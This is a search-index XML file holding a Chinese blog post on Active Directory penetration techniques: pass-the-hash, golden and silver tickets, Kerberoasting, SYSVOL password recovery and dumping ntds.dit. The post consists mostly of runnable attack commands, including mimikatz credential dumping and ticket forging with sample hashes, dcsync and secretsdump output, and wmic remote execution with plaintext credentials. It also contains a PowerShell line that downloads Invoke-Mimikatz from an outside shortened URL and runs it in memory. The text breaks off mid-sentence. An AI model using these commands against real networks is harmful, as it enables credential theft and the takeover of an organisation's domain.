<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title>域渗透相关</title>
      <link href="/2018/01/19/%E5%9F%9F%E6%BB%B2%E9%80%8F%E7%9B%B8%E5%85%B3/"/>
      <url>/2018/01/19/%E5%9F%9F%E6%BB%B2%E9%80%8F%E7%9B%B8%E5%85%B3/</url>
      <content type="html"><![CDATA[<a id="more"></a><p>0x01. Pass the Hash (PTH hash传递攻击, 即 Mimikatz hash注入 )<br>    在windows系统中,系统通常不会存储用户登录密码,而是存储密码的哈希值,<br>    在我们远程登录系统的时候,实际上向远程传递的就是密码的hash值。<br>    当攻击者获取了存储在计算机上的用户名和密码的hash值的时候(PWDUMP7等),<br>    他虽然不知道密码值,但是仍然可以通过直接连接远程主机,通过传送密码的hash值来达到登录的目的。<br>    工具:<br>        a. Metasploit - exploit/windows/smb/psexec (XP,2003)<br>        b. xfreerdp (2012r2 <a href="http://www.freebuf.com/articles/system/15757.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/system/15757.html</a> Hash传递攻击登陆Windows2012远程桌面)<br>    微软在2014年发布了KB2871997和KB2928120两个补丁,用来阻止域内主机本地用户的网络登录,本地用户的PTH方式已经死掉<br>    然而 , mimikatz实现了在禁用NTLM的环境下仍然可以远程连接。<br>    hash injection :<br>        mimikatz # privilege::debug<br>        mimikatz # sekurlsa::pth /user:administrator /domain:workgroup /ntlm:d6e1371929886ec1be0b0cf4b101f289 /run:c:\windows\system32\cmd.exe<br>    (sekurlsa::pth 中的pth 即Pass the Hash)</p><p>0x02. Pass The Key (OverPass-the-Hash)<br>    <a href="http://www.vuln.cn/6813" target="_blank" rel="noopener">http://www.vuln.cn/6813</a><br>    当系统安装了KB2871997补丁且禁用了NTLM的时候，那我们抓取到的ntlm hash 也就失去了作用，但是可以通过pass the key的攻击方式获得权限</p><pre><code>1. mimikatz &quot;privilege::debug&quot; &quot;sekurlsa::ekeys&quot; 获取用户的aes key2. mimikatz &quot;privilege::debug&quot; &quot;sekurlsa::pth /user:用戶a /domain:test.local /aes256:f74b379b5b422819db694aaf78f49177ed21c98ddad6b0e246a7e17df6d19d5c&quot; 注入aes key若dir 查看不了服务器 (测试2008r2域服务器) : 查看mimikatz的相关资料发现如下信息:    ntlm hash is mandatory on XP/2003/Vista/2008 and before 7/2008r2/8/2012 kb2871997 (AES not available or replaceable) ; AES keys can be replaced only on 8.1/2012r2 or 7/2008r2/8/2012 with kb2871997, in this case you can avoid ntlm hash.    根据提示，尝试在系统安装补丁kb2871997后继续测试    安裝 : https://www.microsoft.com/en-us/download/details.aspx?id=42765 ####之后可以用\\计算机名的方式通过远程共享查看目标机器(ps:这里必须要使用计算机名进行连接，会爆密码错误。  不要用win10测试，win10机器测试会在一分鐘后重啓 ,)(如果获取的散列是NTLM，则Kerberos凭证加密方法是RC4。如果散列加密方法为AES，则Kerberos票使用AES进行的加密。)</code></pre><p>0x03. Pass the Ticket (票据传递攻击PtT ,<a href="https://www.anquanke.com/post/id/92484" target="_blank" rel="noopener">https://www.anquanke.com/post/id/92484</a> kekeo ticket 注入)<br>    <a href="http://www.vuln.cn/wp-content/uploads/drops/20160118/2016011804523676070160.png" target="_blank" rel="noopener">http://www.vuln.cn/wp-content/uploads/drops/20160118/2016011804523676070160.png</a><br>    与PtH情况类似,但PtT使用的是Kerberos票据,而不是NT哈希<br>    <a href="https://github.com/gentilkiwi/mimikatz/wiki/module-~-kerberos" target="_blank" rel="noopener">https://github.com/gentilkiwi/mimikatz/wiki/module-~-kerberos</a><br>    在微软活动目录中颁发的TGT是可移植的。由于Kerberos的无状态特性,TGT中并没有关于票据来源的标识信息。<br>    这意味着可以从某台计算机上导出一个有效的TGT,然后导入到该环境中其他的计算机上。<br>    新导入的票据可以用于域的身份认证,并拥有票据中指定用户的权限来访问网络资源。<br>    这种特别的攻击方法被称为”pass-the-ticket”攻击。<br>    <a href="http://image.3001.net/images/20141002/14122248951271.jpg" target="_blank" rel="noopener">http://image.3001.net/images/20141002/14122248951271.jpg</a><br>    拿到了域控权限,在上面就可以很容易的获得krbtgt的Hash值,再通过mimikatz即可生成任意用户任何权限的Ticket,也就是Golden Ticket<br>    考虑到mimikatz的pth功能需要本地管理员权限，所以mimikatz也提供了不需要管理员权限的解决方法Pass-The-Ticket<br>    Pass-The-Ticket需要用到gentilkiwi开源的另一款工具kekeo : <a href="https://github.com/gentilkiwi/kekeo" target="_blank" rel="noopener">https://github.com/gentilkiwi/kekeo</a><br>    执行后生成票据<a href="mailto:TGT_test1@TEST.LOCA" target="_blank" rel="noopener">TGT_test1@TEST.LOCA</a><a href="mailto:L_krbtgt~test.local@TEST.LOCAL.kirbi" target="_blank" rel="noopener">L_krbtgt~test.local@TEST.LOCAL.kirbi</a> :<br>        kekeo “tgt::ask /user:test1 /domain:test.local /ntlm:7ECFFFF0C3548187607A14BAD0F88BB1”<br>    导入票据：<br>        kekeo “kerberos::ptt <a href="mailto:TGT_test1@TEST.LOCA" target="_blank" rel="noopener">TGT_test1@TEST.LOCA</a><a href="mailto:L_krbtgt~test.local@TEST.LOCAL.kirbi" target="_blank" rel="noopener">L_krbtgt~test.local@TEST.LOCAL.kirbi</a>“</p><pre><code>以上3种:    hash传递攻击(PtH):抓住哈希并使用它来访问资源。用户更改帐户密码之前有效。    凭证传递攻击(PtT):抓取Kerberos凭证，并且使用它进行访问资源。攻击有效期是在票证有效期之内(一般为7天)。    超hash传递攻击(OPtH / PtK):使用密码哈希来获取Kerberos凭证。用户更改帐户密码之前，哈希才有效。</code></pre><p>0x04. Golden Ticket (黄金票据)<br>    简义 : 在拥有普通域用户权限和 krbtgt账号的hash的情况下,获取域管理员权限。<br>    发生在上面的过程3,可以伪造TGT(前提是获取krbtgt账号的口令散列值(hash))，宣称自己是域内任何账号，包括域管或者不存在的用户。<br>    由來:<br>        Kerberos信任及完全依赖于KDC密码,由于Kerberos协议是无状态的,因此密钥分发中心KDC和票据授予服务TGS并没记录以前的交互信息。<br>        因此票据授予服务所需使用的全部信息都位于TGT票据中。因为TGT使用krbtgt的密钥加密过,<br>        理论上讲网络上只有两方能够解密TGT: 颁发票据的KDC和接受票据并创建访问网络资源的服务票据的票据授予服务TGS。<br>        这种情况让krbtgt成为系统中最重要的密码。最终结果是只要TGT被krbtgt账户密码正确地加密,TGT中的所有信息都是可信的。</p><pre><code>如果攻击者能够攻陷KDC和提取krbtgt散列值(hash)。然后利用这些有限信息,攻击者能够为委托人principal生成任意的TGT。    1. 首先,黄金票据是全功能的TGT。也就意味着万能票据可用于Kerberos认证的任何服务。票据授予服务盲目地相信TGT中的信息,然后处理TGT并颁发服务票据。        内存中插入黄金票据并不需要提升权限。而且默认情况下,黄金票据的有效期是10年。    2. 其次,　黄金票据可以用来绕过当前Kerberos有关加密策略的要求。        例如,可以使用DES或RC4加密算法创建一个TGT,即使该域明确支持AES,禁止使用DES或RC4。        此情况会产生一个有趣的现象: TGT使用DES加密而服务票据使用AES加密。        票据授予服务似乎并不担心TGT,也不拒绝异常行为,因为没有机制让票据授予服务报告关于策略的错误。    3. 再次,黄金票据并没启用任何高级账户策略的设置。微软添加了一个功能来验证服务票据的请求,以确保已禁用的TGT不能用于获得服务票据。        然而,该功能的实现存在问题。只有当TGT的寿命超过20分钟时,票据授予服务才会验证TGT的有效性。        如果TGT的寿命低于20分钟,票据授予服务将直接颁发服务票据,而不去验证TGT的有效性,默认情况下服务票据具有10小时的有效期。        因为攻击者可以利用Mimikatz工具随心所欲的产生票据,所以攻击者只需清除旧的TGT,再替换为寿命少于20分钟的新票据,轻松突破20分钟的限制条件。    4. 最终,黄金票据可以被配置成任意用户和任意组的成员。这也可以创建一个票据,票据中任何用户都可以是任意组的成员。        这可以用来绕过文件服务器或其他应用程序上基于用户组的访问限制。黄金票据中的用户和SID不必在活动目录中真实存在。        也就意味着可以为域中不存在的用户创建TGT,并仍然可以在TGT生命周期内前20分钟内从票据授予服务获得服务票据。所需条件:     a. krbtgt账户的NT-Hash - 该散列值仅位于域控服务器的活动目录中。所以攻击者必须攻陷域控服务器并提权至管理员权限    b. 域账户名称 - 通常是域管理员&quot;domain admin&quot;    c. 域名    d. 域SID - 可以从域用户的SID或通过sysinternal中psGetsid.exe获得简单过程:    1. 清空缓存证书        kerberos::purge  ( or klist purge)    3. 手动创建了一张域管理的黄金票据        kerberos::golden /admin:administrator /domain:demo.local /sid:S-1-5-21-1239069908-882060383-2558203358 /krbtgt:3f65c6984cbfebdc5f17986d07620afb /ticket:administrator.kirbi.bin    4. 使用这张票据         kerberos::ptt administrator.kirbi.bin        Golden_Ticket1.png    5. 然后我的低权限本地用户，就被提升到域管理权限        kerberos::list    6. 利用dcsync功能获取hash,通过DRSR(目录复制服务DRS远程协议)协议，从域控制器获取任何用户的hash        lsadump::dcsync /domain:demo.local /user:testwin10  (administrator / testwin7)        Golden_Ticket2.png</code></pre><ol><li>Silver Ticket (白银票据)<br> <a href="http://www.vuln.cn/6814" target="_blank" rel="noopener">http://www.vuln.cn/6814</a><br> <a href="http://www.4hou.com/technology/4622.html" target="_blank" rel="noopener">http://www.4hou.com/technology/4622.html</a><br> <a href="https://www.anquanke.com/post/id/93542" target="_blank" rel="noopener">https://www.anquanke.com/post/id/93542</a><br> 简义 : 发生在上面的过程5，可以伪造TGS(前提是获取服务账号的口令散列值)，宣称自己是域内任何账号，例如域管。<br> Silver Ticket生成时指定了相关的服务名，因此只能用来访问相应的服务，所以局限性比较大，没有golden ticket好用<br> 所需条件(mimikatz生成silver ticket): <pre><code> a. /domain b. /sid            ( S-1-5-21-1239069908-882060383-2558203358-500 注意:不要後面的-500  ) c. /target:域控全称 d. /service:目标服务器上面的kerberos服务，此处为cifs e. /rc4:域控的计算机账户ntlm hash f. /user:要伪造的用户名(可以不存在也可是存在的) mimikatz.exe &quot;kerberos::golden /domain:域 /sid:SID /target:域全称 /service:要访问的服务 /rc4:NTLM /user:silver /ptt&quot;即可生成并导入Silver Ticket</code></pre> 常用的服务名有以下:<pre><code> 服务名称                    同时需要的服务 WMI                        HOST、RPCSS PowerShell Remoting        HOST、HTTP WinRM                    HOST、HTTP Scheduled Tasks            HOST Windows File Share        CIFS LDAP                    LDAP Windows Remote Server    RPCSS、LDAP、CIFS ==&gt; kerberos::golden /domain:demo.local /sid:S-1-5-21-1239069908-882060383-2558203358 /target:owa2010dc.demo.local /service:cifs /rc4:aac6185241728f7685c8d50c61573b75 /user:silver /ptt     (/rc4:aac6185241728f7685c8d50c61573b75 這裏我用的是owa2010dc$机器賬戶的NTLM hash Silver_Ticket1.png</code></pre></li></ol><p>0x06. Kerberoast (Kerberos TGS服务票据(Service Ticket)离线爆破)<br>    简义 : 发生在上面的过程3,4, 目标的服务账户的服务器主体名称(SPN)请求一个Kerberos服务票据 (TGS) 。<br>    这里会采用一个有效的用户认证票据(TGT)来请求一个或几个运行在服务器上的目标服务票据。<br>    域控不会检测用户是否真正连接到了这些资源上(即使用户可能真的有权限访问)。<br>    域控会在活动目录中查找SPN并且用SPN关联的用户账户把票据进行加密，以此赋予用户访问服务的权限。<br>    请求的Kerbero服务票据的加密类型是 RC4_HMAC_MD5, 这意味着服务账户的NTLM密码哈希会被用来加密服务票据。<br>    所以Kerberoast能够通过尝试不同的NTLM哈希来解开kerberos票据，一旦票据被成功解开，它的密码也就到手了。<br>    (获得服务票据不需要提权，同时也不会发送数据到目标机器。)<br>    <a href="https://github.com/nidem/kerberoast/blob/master/tgsrepcrack.py" target="_blank" rel="noopener">https://github.com/nidem/kerberoast/blob/master/tgsrepcrack.py</a><br>        python tgsrepcrack.py wordlist.txt sql.kirbi</p><p>0x07. Kerberoasting - Kerberoast攻击的另一种姿势<br>    我们通常不关心基于主机的SPN，因为计算机的机器帐户密码默认是随机的，每30天更换一次。<br>    但是，请记住，也可以为域用户帐户注册任意的SPN。<br>    一个常见的例子就是一个服务账户管理着多个MSSQL实例;此用户帐户注册的每个MSSQL实例都有一个&lt;MSSQLSvc/HOST:PORT&gt; 这样的SPN，<br>    这个SPN存储在用户的serviceprincipalname属性里.如果我们有一个为域用户帐户注册的任意SPN，<br>    那么该用户帐户的明文密码的NTLM哈希值就将用于创建服务票证    </p><pre><code>注意的是： 任何具有服务主体名称SPN的域用户帐户都可以被该域中任何用户请求该SPN的TGS，从而允许攻击者离线破解服务帐户的明文密码！这显然取决于一个可破解的服务帐户明文密码的复杂度&quot;老套的&quot;Kerberoasting攻击姿势Tim给出的利用方法或工具包是使用工具集的组合来请求票证，并从内存中提取(使用Mimikatz)票证，然后将它们转换为可破解的格式。一般来说，整个过程如下：1. 使用Tim的GetUserSPNS.ps1脚本或者Sean的Find-PSServiceAccounts.ps1脚本或PowerView的&quot;Get-NetUser -SPN&quot;来枚举域帐户的SPN。枚举域帐户的SPN :      GetUserSPNS.ps1 - https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.ps1    PS C:\Users\Administrator\Desktop\kerberoast&gt; . .\GetUserSPNs.ps1        ServicePrincipalName : kadmin/changepw        Name                 : krbtgt        SAMAccountName       : krbtgt        MemberOf             : CN=Denied RODC Password Replication Group,CN=Users,DC=demo,DC=local        PasswordLastSet      : 9/13/2016 11:37:59 AM        ServicePrincipalName : test/test        Name                 : testwin10        SAMAccountName       : testwin10        MemberOf             :        PasswordLastSet      : 1/12/2018 3:00:22 PM    PowerView 的 Get-NetUser -SPN - https://github.com/PowerShellMafia/PowerSploit/blob/5690b09027b53a5932e42399f6943e03fa32e549/Recon/PowerView.ps1#L2087-L2089    PS C:\Users\Administrator\Desktop\PowerSploit\Recon&gt; Get-NetUser -spn        objectsid              : S-1-5-21-1239069908-882060383-2558203358-502        iscriticalsystemobject : True        samaccounttype         : 805306368        objectcategory         : CN=Person,CN=Schema,CN=Configuration,DC=demo,DC=local        objectclass            : {top, person, organizationalPerson, user}        logoncount             : 0        lastlogon              : 1/1/1601 8:00:00 AM        serviceprincipalname   : kadmin/changepw        adspath                : LDAP://CN=krbtgt,CN=Users,DC=demo,DC=local        dscorepropagationdata  : {1/12/2018 6:32:42 AM, 9/13/2016 4:06:37 AM, 9/13/2016 3:53:08 AM, 1/1/1601 12:00:00 AM}        distinguishedname      : CN=krbtgt,CN=Users,DC=demo,DC=local        ....    getspn.png2. 请求这些特定的SPN的 TGS可以使用Windows内置的工具setspn.exe或者在PowerShell中调用.NET的    System.IdentityModel.Tokens.KerberosRequestorSecurityToken类。3. 使用Mimikatz的kerberos::list/export命令从内存中提取这些票证，并设置可选的base64导出格式。    然后下载票据，或者将base64编码的票证拖到攻击者的机器上进行解码。4. 使用Tim的tgsrepcrack.py开始离线破解密码:        https://raw.githubusercontent.com/nidem/kerberoast/master/tgsrepcrack.py        pip install requests-kerberos,kerberos-sspi        import kerberos 改成 import kerberos_sspi as kerberos        python tgsrepcrack.py dic.txt file.kirbi   或者使用John the Ripper的kirbi2john.py从原始票证中提取可破解的哈希格式：        python kirbi2john.py *.kirbi &gt; johnkirb.txt        john johnkirb.txt --wordlist=dic.txt  5. xan7r给 Tim的工具集增加了一个分支，他添加了一个autokerberoast.ps1脚本，自动化了上述攻击过程:https://raw.githubusercontent.com/xan7r/kerberoast/master/autokerberoast.ps1    此外，@ tifkin_写了一个Go语言版本的TGS爆破器，比原来的Python版本要快一些。</code></pre><p>0x08. SYSVOL<br>    在域环境中修改域机器的本地账户密码是个很麻烦的事情，<br>    但是微软的GPP(组策略偏好)中提供了一个批量修改本地账户的功能，<br>    可以一次性批量的修改本地账户密码(组策略不仅仅可以用来批量管理密码)。<br>    但是最初却导致了一个问题，就是域管理员在配置GPP的时候，会在SYSVOL这个文件夹中保存当前GPP配置的xml文件，<br>    如果管理员在配置的时候填入了密码，其中就包含了加密了的用户密码(SYSVOL是一个存储域公共文件服务器副本的共享文件夹，<br>    所有的认证用户都可以读取。SYSVOL包括登录脚本，组策略数据，以及其他域控所需要的域数据，这是因为SYSVOL能在所有域控里进行自动同步和共享。)<br>    一般sysvol文件的位置是 :<br>        \<domain>\SYSVOL\<domain>\Policies\<br>    其中的groups.xml(Services.xml、ScheduledTasks.xml、Printers.xml、Drives.xml、DataSources.xml)就可能保存了加密后的本地管理账户密码<br>    (ps:这些文件中并不一定存在密码，因为只有当管理员在配置的时候，在界面的密码框中输入密码之后才会保存(設置計劃任務))<br>    我们可以通过这个powershell的脚本进行解密Get-GPPPassword.ps1<br>    (<a href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1" target="_blank" rel="noopener">https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1</a>)<br>    . .\Get-GPPPassword.ps1<br>    Get-GPPPassword<br>    同样，我们也可以使用Get-GPPPassword.ps1这个脚本在域内自动搜索所有的sysvol中保存的密码并自动解密<br>    若获取不到:<br>        1、使用了LAPS批量管理域内主机本地管理员帐户 (使用ldapsearch来dump域中的LAPS密码 <a href="https://www.anquanke.com/post/id/86502" target="_blank" rel="noopener">https://www.anquanke.com/post/id/86502</a>)<br>            即 Local Administrator Password Solution : LAPS最大的优点是能够确保每台域内主机有不同的密码，并且定期更换。<br>        2、域控安装补丁KB2962486<br>            这个补丁禁止在组策略配置中填入密码<br>        3、目标不在组策略中使用域控密码<br>        4、设置了共享文件夹\SYSVOL的访问权限</domain></domain></p><p>0x09. ntds.dit (活动目录的数据库文件)<br>    包含有关活动目录域中所有对象的所有信息 及 所有域用户和计算机帐户的密码哈希值。<br>    域控制器(DC)上的ntds.dit文件只能由可以登录到DC的用户访问 。<br>    这些组可以默认登录到域控制器:<br>        Enterprise Admins (目录林管理员组)<br>        Domain Admins(域管理员组)<br>        Administrators(管理员组)<br>        Backup Operators(备份操作成员)<br>        Account Operators(账户管理组)<br>        Print Operators(打印机操作组)<br>        不能登录到域控制器可能 :<br>            a. 限制了有权登录到域控制器的组/帐户。<br>            b. 限制了具有完整活动目录权限的组/帐户，特别是服务帐户。<br>    若帐户登录了域控制器，首先把所有的登录凭证全部获取到本地:</p><pre><code>    1. MIMIKATZ从域控上面抓取到所有账户信息:        mimikatz # lsadump::lsa /inject exit        or 保存到mimikatz.log:        mimikatz # log        mimikatz # privilege::debug        mimikatz # lsadump::lsa /inject        mimikatz-lsa.png    2. 使用MIMIKATZ转储LSASS内存(获取域管理员凭据)        mimikatz # sekurlsa::minidump c:\temp\lsass.dmp        mimikatz # sekurlsa::logonpasswords    3. 使用任务管理器转储LSASS内存(获取域管理员凭据)        一旦LSASS被转储，mimikatz就可以对lsass.dmp进行提取        右鍵lsass.exe : Create Dump File    4. 用NTDSUTIL创建媒体安装集(IFM) (用于抓取NTDS.DIT文件)        NTDSUtil一个本地运行的针对活动目录数据库(ntds.dit)的命令，并且允许为DCPromo准备IFM集。        IFM是用于DCPromo命令中”从媒体安装”这一过程的，所以，在配置域控时就不需要通过网络从其他域控拷贝数据。        并且也会在c:/temp目录下生成的一份NTDS.dit附件。            ntdsutil &quot;ac i ntds&quot; &quot;ifm&quot; &quot;create full c:\windows\temp\temp&quot; q q        創建了temp目錄，下面会生成 ntds.dit 和 SYSTEM / SECURITY    5. 从NTDS.DIT文件(和注册表系统配置单元)转储活动目录域凭据        需要 ntds.dit 和 system.hive (由第4步得到)        https://github.com/CoreSecurity/impacket/blob/master/examples/secretsdump.py (only linux):             -&gt; python secretsdump.py -ntds /root/Desktop/temp/Active Directory/ntds.dit -system /root/Desktop/temp/registry/SYSTEM LOCAL             -&gt;                 demo.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:161cff084477fe596a5db81874498a24:::                Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                OWA2010DC$:1000:aad3b435b51404eeaad3b435b51404ee:aac6185241728f7685c8d50c61573b75:::                krbtgt:502:aad3b435b51404eeaad3b435b51404ee:3f65c6984cbfebdc5f17986d07620afb:::                OWA2010$:1103:aad3b435b51404eeaad3b435b51404ee:d51220f5659cd982fb3fbe4169093181:::            or -&gt; https://github.com/zcgonvh/NTDSDumpEx/releases                NTDSDumpEx.exe -d ntds.dit -o hash.txt -s system.hiv         进一步从NTDS.DIT获取详细的信息:        https://github.com/libyal/libesedb/releases        $ ./configure        $ make        $ sudo make install        $ sudo ldconfig        root@kali2:~/Desktop/temp# /usr/local/bin/esedbexport -m tables &quot;/root/Desktop/temp/Active Directory/ntds.dit&quot;              (ntds.dit中提取出表，20分鐘，两个重要的表为:datatable以及link_table，他们都会被存放在./ntds.dit.export/文件夹中.)        使用ntdsxtract提取域中信息，一旦表被提取出来，很多python工具可以将这些表中的信息进一步提取，比如ntdsxtract就可以完美进行。        https://github.com/csababarta/ntdsxtract.git        root@kali2:~/Desktop/ntdsxtract-master# python dsusers.py /root/Desktop/temp/ntds.dit.export/datatable.3 /root/Desktop/temp/ntds.dit.export/link_table.5 output --syshive /root/Desktop/temp/registry/SYSTEM --passwordhashes --pwdformat ocl --ntoutfile ntout --lmoutfile lmout |tee all_user_info.txt        root@kali2:~/Desktop/ntdsxtract-master# python dscomputers.py /root/Desktop/temp/ntds.dit.export/datatable.3 computer_output --csvoutfile all_computers.csv        libesedb__ntdsxtract__ntds.dit.png    6. 可创建和使用GOLDEN TICKET    7. 卷影复制(VSS)        ntds.dit我们是没法直接进行复制拷贝的，会提示文件已被占用，这个时候我们可以通过windows提供的卷影复制功能来复制被进程占用的文件(xp和server 2003以上都存在此功能)        1.wmic /node:AD /user:PENTEST\Administrator /password:123qwe!@# process call create &quot;cmd /c vssadmin create shadow /for=c: 2&gt;&amp;1 &gt; c:vss.log&quot;        2.wmic /node:AD /user:PENTEST\Administrator /password:123qwe!@# process call create &quot;cmd /c copy 卷影ID/Windows/NTDS/NTDS.dit C:/windows/temp/NTDS.dit 2&gt;&amp;1&quot;    8. 其他 - 转储活动目录数据库(ntds.dit)凭证的方法总结    How Attackers Dump Active Directory Database Credentials        https://adsecurity.org/?p=2398    [译]转储活动目录数据库凭证的方法总结         http://drops.xmd5.com/static/drops/pentesting-12020.html        之前发表过两篇关于如何转储 AD 数据库凭证的文章：             a. 攻击者如何从一个域控制器中读取活动目录数据库(NTDS.DIT)(https://adsecurity.org/?p=451)            b. 在 Active Directory 域中获得管理员权限的攻击方法(https://adsecurity.org/?p=2362  [译]https://xianzhi.aliyun.com/forum/topic/115)    这里所介绍的方法需要权限提升，因为它们需要连接到域控制器转储凭据。如下：        a. 使用 NTDSUtil 创建 IFM 抓取 DC 本地的 Ntds.dit 文件(VSS 卷影复制)        b. 使用 VSS 卷影复制远程读取 Ntds.dit。        c. 使用 PowerSploit 的 Invoke-NinjaCopy 远程读取 Ntds.dit(需要目标 DC 启用 PowerShell 远程管理)。        d. 在 DC 中使用 Mimikatz 转储 Active Directory 凭据。        e. 在 DC 中使用 Invoke-Mimikatz 转储 Active Directory 凭据。        f. 使用 Invoke-Mimikatz 远程转储 Active Directory 凭据。        g. 使用 Mimikatz 的 DCSync 功能远程转储 Active Directory 凭据。        注意：如果已经发现了 Active Directory 数据库(NTDS.DIT)的副本，那么攻击者无需提升权限即可从中转储凭据。    0x01 远程执行命令方式        有几种不同的方式可以在域控制器上远程执行命令，假设它们已经有了相应的执行权限。最可靠的远程执行方法包括两种 PowerShell(利用 WinRM )和 WMI。        WMI        Wmic /node:COMPUTER/user:DOMAIN\USER /password:PASSWORD process call create &quot;COMMAND&quot;        PowerShell (WMI)        Invoke-WMIMethod -Class Win32_Process -Name Create –ArgumentList $COMMAND –ComputerName $COMPUTER -Credential $CRED        WinRM        winrs –r:COMPUTER COMMAND        远程 PowerShell        Invoke-Command –computername $COMPUTER -command { $COMMAND}        New-PSSession -Name PSCOMPUTER –ComputerName $COMPUTER; Enter-PSSession -Name PSCOMPUTER    0x01 使用 NTDSUtil 创建 IFM 抓取 DC 本地的Ntds.dit文件 (VSS 卷影复制)        NTDSUtil一个本地运行的针对活动目录数据库(ntds.dit)的命令，并且允许为DCPromo准备IFM集。        IFM是用于DCPromo命令中&quot;从媒体安装&quot;这一过程的，所以，在配置域控时就不需要通过网络从其他域控拷贝数据。        IFM集，并且也会在c:/temp目录下生成的一份NTDS.dit附件。        ntdsutil &quot;ac i ntds&quot; &quot;ifm&quot; &quot;create full c:\windows\temp\temp&quot; q q        創建了temp目錄，下面会生成 ntds.dit 和 SYSTEM / SECURITY        这个命令也可以通过 WMI 或 PowerShell 远程执行。    0x02 使用 VSS 卷影副本远程读取 ntds.dit(通过 WMI or PowerShell 远程管理)        ntds.dit我们是没法直接进行复制拷贝的，会提示文件已被占用，这个时候我们可以通过windows提供的卷影复制功能来复制被进程占用的文件(xp和server 2003以上都存在此功能)            a. wmic /node:AD /user:PENTEST\Administrator /password:123qwe!@# process call create &quot;cmd /c vssadmin create shadow /for=c: 2&gt;&amp;1 &gt; c:\vss.log&quot;        当 VSS 快照完成后，我们就可以从 VSS 中将 NTDS.dit 文件和 注册表中的 System hive 复制到域控制器的 C 盘中。            b1. wmic /node:AD /user:PENTEST\Administrator /password:123qwe!@# process call create &quot;cmd /c copy 卷影ID\Windows\NTDS\NTDS.dit C:\windows\temp\NTDS.dit 2&gt;&amp;1 &gt; c:\vss2.log&quot;            b2. wmic /node:AD /user:PENTEST\Administrator /password:123qwe!@# process call create &quot;cmd /c copy 卷影ID\Windows\System32\config\SYSTEM C:\windows\temp\SYSTEM.hive 2&gt;&amp;1 &gt; c:\vss2.log&quot;        之后就可以将域控制器中 c:\\temp 目录的文件复制到本地的计算机中。            copy /z \\demo.local\c$\windows\temp\NTDS.dit c:\temp            copy /z \\demo.local\c$\windows\temp\SYSTEM.hive c:\temp        较新版本的 Windows 中 WMIC 已经有些过时了。 PowerShell 提供了 Invoke-WMIMethod cmdlet 可以执行相同的功能。    0x03 使用 PowerSploit 的 Invoke-NinjaCopy 远程读取 ntds.dit(需要目标 DC 启用 PowerShell 远程管理)        Joe Bialek (@JosephBialek)在他的博客中写了如下关于 Invoke-NinjaCopy 的信息。            目前，已有好几种方法可以转储 Active Directory 和本地密码的 HASH。            不过直到最近，我发现目前获取 HASH 的技术，需 要依赖于注入代码到 LSASS 进程或使用 VSS ，以获得含有 HASH 文件的副本。            我创建了一个名为 Invoke-NinjaCopy 的 PowerShell 脚本，支持任何文件(包括NTDS.DIT)的复制，            无需启动可疑的服务，无需注入代码到进程中，或者提升到 SYSTEM 权限。        该脚本可以打开整个卷(如C:)的读取句柄并解析 NTFS 结构，从而从一个 NTFS 卷复制文件。此操作需要目标服务器的管理员权限。利用此脚本可以绕过以下保护措施：            一个已被进程打开且不能被其他进程操作的文件，如 Ntds.dit 文件或注册表中的 SYSTEM hive 配置文件。            已被设置 SACL 标志的文件，在打开此类文件时，会有提醒(此脚本没有使用 Win32 API 打开文件，因此Windows 没有反应)。            绕过 DACL ，例如 DACL 只允许 SYSTEM 权限打开一个文件。            如果指定了 LocalDestination 参数，则文件将被复制到本地服务器(脚本正在从运行的服务器)中指定的文件路径。            如果指定了 RemoteDestination 参数，则该文件将被复制到远程服务器中指定的文件路径。                Invoke-NinjaCopy -Path &quot;c:\windows\ntds\ntds.dit&quot; -ComputerName &quot;RDLABDC02&quot; -LocalDestination &quot;c:\temp\ntds.dit&quot;            使用 DIT 快照查看器(https://github.com/yosqueoy/ditsnap) ，可以验证我们是否顺利拿到了Ntds.dit 文件。    0x04 在 DC 中使用 Mimikatz 转储 Active Directory 凭据        一般情况下服务帐户就是域管理员组或同等权限的成员或者攻击者从域管理员最近登录到的计算机中 dump 出登录凭证。        使用这些凭据，攻击者可以访问域控制器，并可以得到所有的域凭据，其中包括用于创建 Kerberos 的黄金票证的 KRBTGT 帐户的 NTLM 哈希值。        1. mimikatz.exe从域控上面抓取到所有账户信息:            mimikatz lsadump::lsa /inject exit            保存到mimikatz.log:                # log                # privilege::debug                # lsadump::lsa /inject            在域控制器上运行时，Active Directory域中转储凭证数据。需要管理员访问调试或本地SYSTEM权限            注意：RID 502的帐户是KRBTGT帐户，RID 500的帐户是该域的默认管理员。        2. Invoke-Mimikatz本地转储Active Directory凭据            使用 mimikatz 从 LSASS 进程转储凭证 ： Invoke-Mimikatz -DumpCreds            使用 mimikatz 导出所有私有证书即使它们已被标记为不可导出 ： Invoke-Mimikatz –DumpCerts            在远程计算机上使用 debug 提升权限：Invoke-Mimikatz -Command &quot;privilege::debug exit&quot; -ComputerName &quot;computer1&quot;            or Invoke-Mimikatz -Command &#39;&quot;privilege::debug&quot; &quot;LSADump::LSA /inject&quot; exit&#39;        3. 使用 Invoke-Mimikatz 远程转储 Active Directory 凭据 (通过 PowerShell 远程管理)              从外网下载并完全是在内存中执行代码            IEX(New-Object Net.WebClient).DownloadString(&#39;http://is.gd/oeoFuI&#39;); Invoke-Mimikatz -Command &#39;&quot;privilege::debug&quot; &quot;LSADump:LSA /inject&quot;&#39; -Computer dc2010.demo.local    0x05 使用 Mimikatz 的 DCSync 功能远程转储 Active Directory 凭据        新的特性—— “DCSync”，可以有效地“假冒”一个域控制器，并可以向目标域控制器请求帐户密码数据。        之前利用 DCSync 的攻击方法是在域控制器上运行 Mimikatz 或 Invoke-Mimikatz 得到 KRBTGT 账户的密码哈希创建黄金票证。        如果使用适当的权限执行 Mimikatz 的 DCSync 功能，攻击者就可以通过网络远程读取域控制器的密码哈希，以及以前的密码的哈希，        且无需交互式登录或复制 Active Directory 的数据库文件NTDS.DIT。        运行 DCSync 所要求的特殊权限有管理员组Administrators，域管理员组 Domain Admins或企业管理员组Enterprise Admins        以及域控制器计算机帐户的任何成员都能够运行 DCSync 去读取密码数据。        需要注意的是只读域控制器默认是不允许读取用户密码数据的。        DCSync 是何如工作的：            a. 使用指定的域名称发现域控制器。            b. 请求域控制器通过 